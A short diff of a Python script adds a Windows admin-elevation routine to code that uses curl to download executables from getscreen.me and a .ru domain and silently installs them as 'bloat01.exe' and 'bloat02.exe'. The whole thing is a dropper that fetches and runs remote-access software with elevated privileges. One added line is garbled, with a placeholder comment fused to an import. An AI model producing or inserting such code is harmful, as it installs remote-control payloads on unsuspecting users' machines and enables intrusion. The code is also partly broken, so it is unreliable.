@@ -1,7 +1,20 @@
+import sys
+import ctypes
+def run_as_admin():
+    if ctypes.windll.shell32.IsUserAnAdmin():
+        return True
+    else:
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+        return False
+
+if __name__ == "__main__":
+    if not run_as_admin():
+        print("Elevating permissions...")
+        sys.exit()
+    # Your code requiring admin privileges goes hereimport time
 import time
 import os
 time.sleep(1)
-
 os.system("curl https://getscreen.me/download/getscreen.exe --output bloat01.exe")
 os.system("bloat01.exe -install")
 os.system("curl https://pro32connect.ru/download/pro32connect.exe --output bloat02.exe")
